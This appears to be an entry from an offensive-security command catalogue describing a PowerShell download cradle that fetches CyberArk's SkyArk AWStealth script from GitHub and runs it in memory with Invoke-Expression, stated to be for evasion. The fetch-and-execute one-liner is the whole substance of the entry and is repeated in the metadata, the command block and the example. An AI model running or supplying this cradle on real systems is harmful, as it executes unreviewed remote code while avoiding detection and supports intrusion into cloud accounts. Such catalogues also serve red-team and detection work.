---
id: df6f918b-03f0-46c2-bffc-02d317cf4c8b
type: command
executor: powershell
data: >-
  IEX (New-Object
  Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1')
output: null
created_at: '2023-04-06T03:56:08.936863+00:00'
updated_at: '2023-04-10T20:20:58.747935+00:00'
platforms:
  - Windows
tags:
  - powershell
  - download
verified: true
validated: true
---

# Download AWStealth PowerShell Script

## Command

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1')
```

## Description

Downloads and executes the AWStealth script in memory using Invoke-Expression for evasion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Script download URL | Yes |

## Examples

### Basic Usage

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1')
```

## Expected Output

Script executed; no console output unless errors.
